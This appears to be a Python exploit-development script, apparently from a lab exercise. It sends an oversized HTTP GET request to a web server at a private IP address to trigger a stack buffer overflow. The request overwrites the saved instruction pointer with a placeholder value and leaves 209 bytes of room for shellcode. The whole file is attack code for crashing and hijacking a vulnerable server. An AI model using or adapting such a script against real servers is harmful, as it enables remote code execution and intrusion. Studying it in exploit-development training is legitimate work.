# Buffer size 1787
# Overwrite EIP with 0x42424242
# Additional buffer after EIP calculation:
#   2000 - 1787 - 4 = 209 bytes (this will be used for shellcode and additional NOP padding)

import socket, struct

buf = "GET "
buf += "A" * 1787
buf += struct.pack("<L", 0x42424242)
buf += "C" * (2000 - 1787 - 4)
buf += " HTTP/1.1\r\n\r\n"

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('192.168.61.148',80))
s.send(buf)
s.close()
